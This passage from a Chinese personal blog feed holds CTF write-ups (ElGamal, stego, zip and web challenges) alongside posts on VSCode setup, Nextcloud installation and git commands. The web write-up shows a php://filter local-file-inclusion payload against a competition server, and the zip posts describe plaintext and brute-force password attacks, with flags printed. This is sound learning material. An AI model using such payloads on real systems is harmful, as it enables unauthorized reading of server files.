<h3 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a>ElGamal</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;./output.txt&#x27;</span>).read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">g, h, A, B, p, q = <span class="built_in">eval</span>(data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">c1, c2 = <span class="built_in">eval</span>(data[<span class="number">1</span>])</span><br><span class="line">c1_, c2_ = <span class="built_in">eval</span>(data[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">tmp = gmpy2.powmod(c2, A, p) * gmpy2.powmod(h, B, p) * gmpy2.invert(c2_, p)</span><br><span class="line">tmp = tmp % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;t=&#x27;</span>, tmp</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;A=&#x27;</span>, A</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;p=&#x27;</span>, p</span><br><span class="line">gg, x, y = gmpy2.gcdext(A - <span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span> gg</span><br><span class="line"></span><br><span class="line">m = gmpy2.powmod(tmp, x, p)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(m)[<span class="number">2</span>:].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到-2"><a href="#签到-2" class="headerlink" title="签到"></a>签到</h3><p>base32解码</p>
<h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>zsteg直接出</p>
<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/QQ%E5%9B%BE%E7%89%8720211007231453.png"></p>
<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>百度识图，福尔摩斯，搜索发现跳舞的小人</p>
<p>发现提示信息<a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p>密码文件虽然空白但是占用空间很大，用上面的工具</p>
<p>最后16进制转字符串得到flag</p>
<h3 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h3><p>扫描机票上的条形码即可，属于pdf417，m1后面就是姓名</p>
<p><a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a></p>
]]></content>
      <categories>
        <category>ctf学习</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>CUMTCTF春季赛部分writeup</title>
    <url>/posts/17e673fc/</url>
    <content><![CDATA[<blockquote>
<p>大佬队友最近忙着转专业，学高数，本菜鸡无奈只能做了做几个简单题。</p>
</blockquote>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>F12发现hint，base64解码为scan.php,又根据一开始的 <strong>include_once $_GET[‘filename’]</strong> ，猜测到可能是php伪协议，构造payload:<a href="http://219.219.61.234:50055/?filename=php://filter/read=convert.base64-encode/resource=scan.php">http://219.219.61.234:50055/?filename=php://filter/read=convert.base64-encode/resource=scan.php</a>。<br>得到一串base64编码</p>
<p>PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCiRkaXIgPSBAJF9HRVRbJ2Rpcm5hbWUnXTsNCg0KaWYoISRkaXIpew0KDQokZGlyID0gJy8nOw0KDQp9DQoNCnZhcl9kdW1wKHNjYW5kaXIoJGRpcikpOwo=</p>
<p>解码获得</p>
<pre><code>&lt;?php
error_reporting(0);
$dir = @$_GET[&#39;dirname&#39;];

if(!$dir)&#123;

$dir = &#39;/&#39;;

&#125;

var_dump(scandir($dir));
</code></pre>
<p>传入dirname,一顿尝试下找到路径 dirname=/var/www/html 有个flaggggg.php<br>继续构造php伪协议 payload:<a href="http://219.219.61.234:50055/?filename=php://filter/read=convert.base64-encode/resource=flaggggg.php">http://219.219.61.234:50055/?filename=php://filter/read=convert.base64-encode/resource=flaggggg.php</a><br>又得到一串base64 </p>
<p>PD9waHAKJGZsYWc9IkNVTVRDVEZ7cXdlckBhc2RmQC0xMjN9IjsKJGhlbGxvPSJUaGlzIGNvbXBldGl0aW9uIGlzIHZlcnkgZWFzeS4gUGxlYXNlIGRvbid0ICBQWS4gSGF2ZSBhIGdvb2QgdGltZSIKPz4=</p>
<p>解码获得flag</p>
<pre><code>&lt;?php
$flag=&quot;CUMTCTF&#123;qwer@asdf@-123&#125;&quot;;
$hello=&quot;This competition is very easy. Please don&#39;t  PY. Have a good time&quot;
?&gt;
</code></pre>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="签到题-1"><a href="#签到题-1" class="headerlink" title="签到题"></a>签到题</h2><p>call_me_please 想到是手机的九宫格 照着顺序点一点flag就出来了</p>
<p><img src="https://my-photos-test.oss-accelerate.aliyuncs.com/photos/20210329001859.png"></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="i-wanna-CUMTCTF"><a href="#i-wanna-CUMTCTF" class="headerlink" title="i wanna CUMTCTF"></a>i wanna CUMTCTF</h2><p>这个小游戏还挺难的，一开始打算破解,没成功。后来想到flag可能在图片上给出，foremost的确提取出来了两个图片，以为是隐写，找了半天没找到。无奈之下，返璞归真，死了几十次，通关，果然在背景图片上，但为啥没提取出来……</p>
<h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>点开看了看，是个套娃，filezip-&gt;tarzip-&gt;filezip-&gt;tarzip-&gt;……-&gt;flag</p>
<p>简简单单，写了个python脚本</p>
<pre><code>import shutil
import zipfile
import tarfile
import os


def unzip():
    path = r&#39;E:\temp\zipfile&#39;
    z = zipfile.ZipFile(path, &#39;r&#39;)
    unzip_path = os.path.split(path)[0]
    z.extractall(path=unzip_path)
    z.close();
    if os.path.exists(path):
        os.remove(path)


def untar():
    path = r&#39;E:\temp\tarfile&#39;
    t = tarfile.TarFile(path, &#39;r&#39;)
    untar_path = os.path.split(path)[0]
    t.extractall(path=untar_path)
    t.close();
    if os.path.exists(path):
        os.remove(path)


if __name__ == &#39;__main__&#39;:
    p1 = r&#39;E:\temp\zipfile&#39;
    p2 = r&#39;E:\temp\tarfile&#39;
while os.path.exists(p1) or os.path.exists(p2):
    unzip()
    untar()
</code></pre>
<p>最后解压出个flag文件，flag在那里面</p>
<h2 id="大物实验"><a href="#大物实验" class="headerlink" title="大物实验"></a>大物实验</h2><p>下载下来是选大物实验网站的一部分源码。先把所有源码浏览了一遍，发现在config.json中有串base64,解码：how to use git? 想到可能有git泄露，先使用git log命令看一下日志</p>
<p><img src="https://my-photos-test.oss-accelerate.aliyuncs.com/photos/20210329170156.png"></p>
<p>利用git reset –hard  c6fb5a10a900bbc2940453cc9efb7e5f86236c0f</p>
<p>回退到之前版本</p>
<p><img src="https://my-photos-test.oss-accelerate.aliyuncs.com/photos/20210329170338.png"></p>
<p>成功在config.json中找到一串base64,解码获得flag</p>
<h2 id="调查问卷"><a href="#调查问卷" class="headerlink" title="调查问卷"></a>调查问卷</h2><p>QQ填完调查问卷，flag在问卷里。</p>
<h2 id="ez-zip"><a href="#ez-zip" class="headerlink" title="ez_zip"></a>ez_zip</h2><p>考察压缩包加密。</p>
<p>打开压缩包，一开始就加密了，猜测可能是伪加密，010打开，果然伪加密,将09改成00，成功</p>
<p><img src="https://my-photos-test.oss-accelerate.aliyuncs.com/photos/20210329202024.png"></p>
<p>打开NO PASSWORD.txt 提示不关心密码，关心存储。先用 ARCHPR 爆破了一波，没出来。</p>
<p><img src="https://my-photos-test.oss-accelerate.aliyuncs.com/photos/20210329202722.png"></p>
<p><img src="https://my-photos-test.oss-accelerate.aliyuncs.com/photos/20210329202756.png"></p>
<p>发现 MISC.zip 里面也有一个 NO PASSWORD.txt 并且与ez_zip中的 NO PASSWORD.txt crc32值一样，想到可能是明文攻击，继续利用ARCHPR，将NO PASSWORD.txt压缩成zip,进行明文攻击，得到密码。</p>
<pre><code>Advanced Archive Password Recovery 统计信息:
加密的 ZIP/RAR/ACE/ARJ 文件: C:\Users\86155\Desktop\MISC.zip
总计口令: n/a
总计时间: 2m 1s 533ms 
平均速度(口令/秒): n/a
这个文件的口令 : #2$i%1
十六进制口令: 23 32 24 69 25 31 
</code></pre>
<p>打开hint提示4位小写字母，直接爆破，得到flag.zip密码yyds，解压后打开文件乱码，用010打开，发现BMP的文件头，修改后缀，得到一张二维码，扫码获得flag</p>
]]></content>
      <categories>
        <category>ctf学习</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>58.245.43.163</title>
    <url>/posts/b47b00b2/</url>
    <content><![CDATA[<h1 id="这几把谁啊，真是闲的蛋疼"><a href="#这几把谁啊，真是闲的蛋疼" class="headerlink" title="这几把谁啊，真是闲的蛋疼"></a>这几把谁啊，真是闲的蛋疼</h1><p>一共访问了1700多次，合着跑字典呢</p>
<p><img src="https://raw.githubusercontent.com/Haorical/images/master/2021/20210818114140.png?token=AQ4CEDHEUHVKVWVNHKIAYQDBDSA3A" alt="git"></p>
]]></content>
  </entry>
  <entry>
    <title>V&amp;NCTF2021</title>
    <url>/posts/6dd4bc92/</url>
    <content><![CDATA[<blockquote>
<p>部分wp</p>
</blockquote>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="冰冰好像藏着什么密码"><a href="#冰冰好像藏着什么密码" class="headerlink" title="冰冰好像藏着什么密码"></a>冰冰好像藏着什么密码</h3><p>先打开图片，报了一堆错，但能正常提取。FFT是快速傅里叶变化的意思，相当于给了提示，补了一些相关知识。</p>
<p>原理如下，并不是很复杂：</p>
<p>首先将图片看作信号,</p>
<p><img src="https://www.zhihu.com/equation?tex=%5BR+%5C+G+%5C+B%5D+=+f(x,y)"></p>
]]></content>
      <categories>
        <category>ctf学习</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>CUMT初夏赛部分wp</title>
    <url>/posts/b061f28/</url>
    <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><blockquote>
<p>这次队友很给力，大佬pwn几乎全做完了，我这个摸鱼选手很惭愧，最后得分听高的，web刷题，在这次有了点收获，最少有思路了，和另一个大佬一交流，就做出来了，最近刷题还是很值得的。</p>
</blockquote>
<h2 id="ez-base"><a href="#ez-base" class="headerlink" title="ez_base"></a>ez_base</h2><p>扫码获得压缩包密码，打开后观察文件，将字符串翻转一下，base32解密发现png头，转图片得到flag</p>
<h2 id="ez-img"><a href="#ez-img" class="headerlink" title="ez_img"></a>ez_img</h2><p>图片明显没显示全，直接爆破高，改高后获得flag</p>
<h2 id="一个不小的文件"><a href="#一个不小的文件" class="headerlink" title="一个不小的文件"></a>一个不小的文件</h2><p>文件很大，最后=结尾，怀疑base64，观察前几个字符，怀疑base64套娃，直接上脚本获得flag</p>
<pre><code>#-*- coding:utf-8 -*-
import base64

s=&#39;&#39;
with open(&#39;problem.txt&#39;, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:
    s=&quot;&quot;.join(f.readlines()).encode(&#39;utf-8&#39;)
src=s
while True:
    try:
        src=s
        s=base64.b64decode(s)
        str(s,&#39;utf-8&#39;)
        continue
    except:
        pass
    break
with open(&#39;result.txt&#39;,&#39;w&#39;, encoding=&#39;utf-8&#39;) as file:
    file.write(str(src,&#39;utf-8&#39;))
print(&quot;ok!&quot;)
</code></pre>
<h2 id="嗷呜"><a href="#嗷呜" class="headerlink" title="嗷呜"></a>嗷呜</h2><p>这个属实被整懵逼了，兽音译者翻译后获得</p>
<pre><code>fc34f44b75ae100abb2af0e28b9251e5e59b5faf
</code></pre>
<p>最后给hint才知道是个p2p种子</p>
<pre><code>payload：magnet:?xt=urn:btih:fc34f44b75ae100abb2af0e28b9251e5e59b5faf
</code></pre>
<p>下载后零宽字符隐写，网站解码获得flag</p>
<h2 id="键盘侠"><a href="#键盘侠" class="headerlink" title="键盘侠"></a>键盘侠</h2><p>wireshark打开，发现全是USB协议，了解了一下，1.9.1的最后8个字节记录键盘数据，不断在变，直接用tshark提取不出来，对着表一个个对，获得flag</p>
<h2 id="LRU"><a href="#LRU" class="headerlink" title="LRU"></a>LRU</h2><p>直接贴脚本</p>
<pre><code>def replace_word(l, a):
    l.remove(a)
    l.append(a)
    return l


str = &#39;3 0 @ &#123; o e f m t c y f e o &#123; @ 0 3 a u o r t r o u a 3 o @ &#123; e f y e &#123; @ o 3 a u o r 0 _ i o u e y g a 3 @ h 0 _ t o u e y b 3 a @ _ 0 d c @ a 3 b g e u o f t y g j k z c v f h j k v n m r t u i p k j y t r f v n m d e w o i u h g r k l m u t r e d f h n b f d e u i o p l m n g h y t r e w a q z x c f h j y e s &#125; j h f c x z q a b d e g&#39;
i_str = list(&#39;cfmteo&#123;@0uya&#39;)
s_str = str.split(&#39; &#39;)
flag = []

for i in s_str:
        if i in i_str:
            i_str = replace_word(i_str, i)
        else:
            a, *i_str = i_str
            i_str.append(i)
            flag.append(a)
        print(i_str)
print(&#39;&#39;.join(flag))
</code></pre>
]]></content>
      <categories>
        <category>ctf学习</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCode简单配置C艹环境</title>
    <url>/posts/c150e260/</url>
    <content><![CDATA[<h2 id="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"><a href="#百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode" class="headerlink" title="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"></a>百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode</h2><h2 id="脑子是个好东西，建议多动手才好用"><a href="#脑子是个好东西，建议多动手才好用" class="headerlink" title="脑子是个好东西，建议多动手才好用"></a>脑子是个好东西，建议多动手才好用</h2><h2 id="需要的东西已打包，还学不会，建议回家种地"><a href="#需要的东西已打包，还学不会，建议回家种地" class="headerlink" title="需要的东西已打包，还学不会，建议回家种地"></a>需要的东西已打包，还学不会，建议回家种地</h2><h2 id="VSCode在官网上下，别TM随便找到个能下的就下"><a href="#VSCode在官网上下，别TM随便找到个能下的就下" class="headerlink" title="VSCode在官网上下，别TM随便找到个能下的就下"></a>VSCode在官网上下，别TM随便找到个能下的就下</h2><blockquote>
<p>已经帮好几个人装了VSCode，没意思，就这nt操作浪费时间实属没必要，下面详细操作，希望看到的多多传播，不要再白白耗费时间在这无意义的事上</p>
</blockquote>
<ol>
<li>下载链接中的东西</li>
</ol>
<ul>
<li><p>链接：<a href="https://pan.baidu.com/s/1cY9v4UrhH_n61JUoQeXn0Q">https://pan.baidu.com/s/1cY9v4UrhH_n61JUoQeXn0Q</a> 提取码：upvq</p>
</li>
<li><p>链接：<a href="https://pan.baidu.com/s/12HPe2Mh3yt-eTiA9Quai8Q">https://pan.baidu.com/s/12HPe2Mh3yt-eTiA9Quai8Q</a> 提取码：zh7k</p>
</li>
</ul>
<ol start="2">
<li><p>将mingw-w64解压后直接拖入C盘</p>
</li>
<li><p>新建fuck文件夹，将.vscode解压后拖入该文件夹中</p>
</li>
<li><p>将下面这句添加环境变量,path中新建，不会的百度</p>
<p> C:\mingw-w64\x86_64-8.1.0-posix-seh-rt_v6-rev0\mingw64\bin</p>
</li>
<li><p>vscode中安装必要插件，与C++有关的建议看不懂英文的全装，看的懂的选有用的装，懒得看的也全装</p>
</li>
<li><p>右键fuck文件夹，选通过vscode打开,写helloworld测试</p>
</li>
<li><p>运行成功的皆大欢喜,不成功的重复1-6步100-200遍，还不成功的，老老实实用你的devc++</p>
</li>
<li><p>over</p>
</li>
</ol>
]]></content>
      <categories>
        <category>哎，我就是玩</category>
      </categories>
  </entry>
  <entry>
    <title>nextcloud安装及踩坑指南</title>
    <url>/posts/aa5139ab/</url>
    <content><![CDATA[<blockquote>
<p>服务器除了用来搭博客和内网穿透之外没干其他的，感觉有点浪费，今天简简单单搭了个网盘打算榨干它。</p>
</blockquote>
<h1 id="私有云选择"><a href="#私有云选择" class="headerlink" title="私有云选择"></a>私有云选择</h1><p>尝试了以下几个</p>
<ol>
<li>cloudreve</li>
<li>seafile</li>
<li>nextcloud</li>
</ol>
<p> cloudreve比较nt，属于傻瓜式，这个不展开了</p>
<p>seafile就比较复杂，不过有详细的<a href="https://cloud.seafile.com/published/seafile-manual-cn/home.md">官方文档</a>，一步一步来就行，我最后搭建成功了，但无法外网访问，应该是反向代理的问题，nginx反向代理配置这比较复杂。</p>
<p>最后选择的是nextcloud,感觉用起来和onedrive差不多，不过既然是榨干服务器，就不管这么多了。</p>
<h1 id="安装指南"><a href="#安装指南" class="headerlink" title="安装指南"></a>安装指南</h1><h2 id="服务器安装宝塔面板和LNMP环境"><a href="#服务器安装宝塔面板和LNMP环境" class="headerlink" title="服务器安装宝塔面板和LNMP环境"></a>服务器安装宝塔面板和LNMP环境</h2><p>这个在阿里云可以一键配置，不过重装的话要慎重。</p>
<p><img src="https://img-blog.csdnimg.cn/4f9f34086cac44848091876038542157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>安装的教程也一大堆，这个比较简单。</p>
<h2 id="新建站点"><a href="#新建站点" class="headerlink" title="新建站点"></a>新建站点</h2><p>马赛克处是域名和站点目录，php版本记得选择7.2以上的</p>
<p><img src="https://img-blog.csdnimg.cn/ae965156e3274e97a1edd3e6de6cc00f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/ec6309d6b2ae4bc4afcca9c45776905a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="部署nextcloud"><a href="#部署nextcloud" class="headerlink" title="部署nextcloud"></a>部署nextcloud</h2><p>在<a href="https://nextcloud.com/install/#instructions-server">官网</a>下载nextcloud,下载完是一个压缩包，上传到刚建立的站点目录上，在线解压，如图</p>
<p><img src="https://img-blog.csdnimg.cn/c413fb8bf47948b7b4b87ecfc0db7e9c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>然后直接访问刚才绑定的域名，会让配置管理员等。进来之后就是这个了。</p>
<p><img src="https://img-blog.csdnimg.cn/029643a8e43b4bad8077560c12de1dc4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>感觉相当于网页版的onedrive，客户端涵盖主流设备可以在官网或控制台下载也可以直接用网页版的，客户端需要绑定域名。</p>
<p><strong>enjoy!</strong></p>
<h1 id="踩坑指南"><a href="#踩坑指南" class="headerlink" title="踩坑指南"></a>踩坑指南</h1><h2 id="不要使用php那个安装方法"><a href="#不要使用php那个安装方法" class="headerlink" title="不要使用php那个安装方法"></a>不要使用php那个安装方法</h2><p>亲测网速太慢，160MB安装到什么时候，过一会就502，这个方法不建议</p>
<p><img src="https://img-blog.csdnimg.cn/c34a492054e94984b7be2ce12b42b667.png" alt="在这里插入图片描述"></p>
<h2 id="php版本"><a href="#php版本" class="headerlink" title="php版本"></a>php版本</h2><p>7.2以上，太低不支持。</p>
<h2 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir()"></a>open_basedir()</h2><p>不要在宝塔开防止跨站攻击，会禁用这个函数，然后会一直报错。</p>
<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><h2 id="网页版"><a href="#网页版" class="headerlink" title="网页版"></a>网页版</h2><p><img src="https://img-blog.csdnimg.cn/f3e47df24bb340fc86059b5a6350cfa5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="win客户端"><a href="#win客户端" class="headerlink" title="win客户端"></a>win客户端</h2><p><img src="https://img-blog.csdnimg.cn/159c13e5061941968b962190c8c02a6f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b4380ed44fc64812b81efbf854040122.png" alt="在这里插入图片描述"></p>
<blockquote>
<p>跟onedrive好像，也是直接把文件拖到工作区就能上传，还能自动同步。</p>
</blockquote>
<h2 id="android客户端"><a href="#android客户端" class="headerlink" title="android客户端"></a>android客户端</h2><p><img src="https://img-blog.csdnimg.cn/29ae730f74764937b67f756ccdf7e13e.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="请添加图片描述"></p>
<blockquote>
<p>UI不错</p>
</blockquote>
<hr>
<h1 id="挂载oss"><a href="#挂载oss" class="headerlink" title="挂载oss"></a>挂载oss</h1><blockquote>
<p>oss用来当图床有点浪费,可以利用ossfs挂载到服务器上</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/7a49ae9e71b64f3f92358d5534d3da36.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwMDM4MjEx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><del>一共256T，能装好多小姐姐</del></p>
<ol>
<li><p><a href="https://help.aliyun.com/document_detail/153892.html?spm=a2c4g.11186623.6.903.692e7a74lkBKbz">官方文档</a>有详细操作，先把bucket挂载到文件夹</p>
</li>
<li><p>在nextcloud开启externalstorage，在设置中外部存储选则挂载的位置<br><img src="https://img-blog.csdnimg.cn/d663518b1e624535a6095021f7006900.png" alt="在这里插入图片描述"></p>
</li>
</ol>
<p> 宝塔可以直接识别，好爽</p>
<p><img src="https://img-blog.csdnimg.cn/b1bc5b927f72461ca5c8acfafaa18a18.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>哎，我就是玩</category>
      </categories>
      <tags>
        <tag>server</tag>
      </tags>
  </entry>
  <entry>
    <title>git学习</title>
    <url>/posts/e28ceec1/</url>
    <content><![CDATA[<h1 id="git入门到精通"><a href="#git入门到精通" class="headerlink" title="git入门到精通"></a>git入门到精通</h1><blockquote>
<p>跟着廖雪峰的教程走了一遍，系统学习一下，感觉挺简单的</p>
</blockquote>
<h2 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init 将目录初始化成版本库</span><br><span class="line"></span><br><span class="line">git add &lt;file&gt; 将文件添加到暂存区</span><br><span class="line"></span><br><span class="line">git commit -m &quot;message&quot; 将暂存区文件提交到版本库</span><br><span class="line"></span><br><span class="line">git status 查看库状态</span><br><span class="line"></span><br><span class="line">git diff 查看status修改文件修改内容</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="版本管理"><a href="#版本管理" class="headerlink" title="版本管理"></a>版本管理</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log 显示从最近到最远的提交日志 --pretty&#x3D;oneline参数精简显示</span><br><span class="line"></span><br><span class="line">git reset --hard HEAD^ 回退到上个版本，HEAD表示当前版本</span><br><span class="line"></span><br><span class="line">git reset --hard &lt;commit id&gt; 回退到指定版本</span><br><span class="line"></span><br><span class="line">git reflog 记录每次指令，包括commit id</span><br><span class="line"></span><br><span class="line">git checkout -- &lt;file&gt; 丢弃工作区修改，用版本库里的版本替换工作区的版本</span><br><span class="line"></span><br><span class="line">git reset HEAD &lt;file&gt; 将暂存区修改撤销并放回工作区</span><br><span class="line"></span><br><span class="line">git rm &lt;file&gt; 工作区删除后需要rm(add)和commit</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master 把本地master分支的最新修改推送至GitHub</span><br><span class="line"></span><br><span class="line">git remote -v 查看远程库信息</span><br><span class="line"></span><br><span class="line">git remote rm origin 解除绑定</span><br><span class="line"></span><br><span class="line">git clone git@github.com:XXX&#x2F;XXX.git clone本地库</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><h3 id="创建与合并分支"><a href="#创建与合并分支" class="headerlink" title="创建与合并分支"></a>创建与合并分支</h3><p>一开始的时候，master分支是一条线，Git用master指向最新的提交，再用HEAD指向master，就能确定当前分支，以及当前分支的提交点：</p>
<p><img src="https://static.liaoxuefeng.com/files/attachments/919022325462368/0"></p>
<p>当我们创建新的分支，例如dev时，Git新建了一个指针叫dev，指向master相同的提交，再把HEAD指向dev，就表示当前分支在dev上：</p>
<p><img src="https://www.liaoxuefeng.com/files/attachments/919022363210080/l"></p>
<p>不过，从现在开始，对工作区的修改和提交就是针对dev分支了，比如新提交一次后，dev指针往前移动一步，而master指针不变：</p>
<p><img src="https://www.liaoxuefeng.com/files/attachments/919022387118368/l"></p>
<p>假如我们在dev上的工作完成了，就可以把dev合并到master上。Git怎么合并呢？最简单的方法，就是直接把master指向dev的当前提交，就完成了合并：</p>
<p><img src="https://www.liaoxuefeng.com/files/attachments/919022412005504/0"></p>
<p>合并完分支后，甚至可以删除dev分支。删除dev分支就是把dev指针给删掉，删掉后，我们就剩下了一条master分支：</p>
<p><img src="https://www.liaoxuefeng.com/files/attachments/919022479428512/0"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b &lt;dev&gt; 创建并切换分支到dev</span><br><span class="line"></span><br><span class="line">git branch &lt;name&gt; 创建分支</span><br><span class="line"></span><br><span class="line">git checkout &lt;name&gt; 切换分支</span><br><span class="line"></span><br><span class="line">git branch 查看当前分支</span><br><span class="line"></span><br><span class="line">git merge &lt;dev&gt; 将dev分支上的内容合并到master分支</span><br><span class="line"></span><br><span class="line">git branch -d &lt;dev&gt; 删除dev分支</span><br><span class="line"></span><br><span class="line">新特性switch</span><br><span class="line"></span><br><span class="line">git switch -c &lt;dev&gt; 创建并切换分支到dev</span><br><span class="line"></span><br><span class="line">git switch &lt;dev&gt; 切换分支</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="冲突解决"><a href="#冲突解决" class="headerlink" title="冲突解决"></a>冲突解决</h3><p>当Git无法自动合并分支时，就必须首先解决冲突。解决冲突后，再提交，合并完成。</p>
<p>解决冲突就是把Git合并失败的文件手动编辑为我们希望的内容，再提交。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git status 查看冲突文件</span><br><span class="line">git log --graph --pretty&#x3D;oneline --abbrev-commit 查看分支合并图</span><br></pre></td></tr></table></figure>

<h3 id="分支管理策略"><a href="#分支管理策略" class="headerlink" title="分支管理策略"></a>分支管理策略</h3><p>在实际开发中，我们应该按照几个基本原则进行分支管理：</p>
<p>首先，master分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；</p>
<p>那在哪干活呢？干活都在dev分支上，也就是说，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本；</p>
<p>你和你的小伙伴们每个人都在dev分支上干活，每个人都有自己的分支，时不时地往dev分支上合并就可以了。</p>
<p>所以，团队合作的分支看起来就像这样：</p>
<p><img src="https://www.liaoxuefeng.com/files/attachments/919023260793600/0"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git merge --no-ff -m &quot;message&quot; &lt;dev&gt; 禁用Fast forward</span><br></pre></td></tr></table></figure>
<h3 id="bug分支"><a href="#bug分支" class="headerlink" title="bug分支"></a>bug分支</h3><p>修复bug时，我们会通过创建新的bug分支进行修复，然后合并，最后删除；</p>
<p>当手头工作没有完成时，先把工作现场git stash一下，然后去修复bug，修复后，再git stash pop，回到工作现场；</p>
<p>在master分支上修复的bug，想要合并到当前dev分支，可以用git cherry-pick <commit id>命令，把bug提交的修改“复制”到当前分支，避免重复劳动。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git stash list 查看工作现场</span><br><span class="line"></span><br><span class="line">git stash apply 恢复现场</span><br><span class="line"></span><br><span class="line">git stash drop 删除现场</span><br><span class="line"></span><br><span class="line">git stash pop 恢复并删除现场</span><br></pre></td></tr></table></figure>

